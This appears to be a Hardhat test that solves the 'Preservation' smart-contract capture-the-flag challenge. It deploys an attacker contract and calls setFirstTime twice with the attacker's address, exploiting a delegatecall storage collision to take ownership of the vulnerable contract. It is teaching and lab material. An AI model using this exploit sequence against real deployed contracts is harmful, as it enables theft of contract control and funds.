import { loadFixture, ethers, expect } from "./setup";

describe("Preservation", function() {

    async function deploy() {
        const signers = await ethers.getSigners();

        const factory = await ethers.getContractFactory("Preservation");
        const contract = await factory.deploy(signers[2], signers[3]);
        
        const attackerFactory = await ethers.getContractFactory("PreservationAttacker");
        const attacker = await attackerFactory.deploy();

        await contract.waitForDeployment();

        return { contract, attacker, signers }
    }

    it("Solve the challenge", async function() {
        let tx;
        const { contract, attacker } = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;

        const uintAddress = await attacker.getUintAddress();

        tx = await contract.setFirstTime(uintAddress);
        await tx.wait();
        
        tx = await contract.setFirstTime(uintAddress);
        await tx.wait();
        
        const owner = await contract.owner();

        expect(owner).to.be.equal(attacker.target);
    });

});